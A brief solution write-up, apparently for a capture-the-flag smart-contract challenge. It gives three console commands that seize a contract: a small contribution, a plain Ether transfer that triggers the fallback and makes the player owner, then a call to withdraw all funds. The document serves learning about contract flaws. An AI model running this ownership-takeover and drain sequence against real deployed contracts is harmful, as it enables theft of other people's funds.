Solution:

1. Call contribute. Send Ether with ABI call. 
await contract.contribute.sendTransaction({value:toWei('.0001')})

2. Call fallback.  Send Ether without using ABI.
await sendTransaction({value:toWei(".00000001"), from:player, to: contract.address})
I am now the owner.

3. Transfer all funds to yourself.
await contract.withdraw() 

Other Notes:
-grab value out of returned JS promise object .then(v => v.toString())
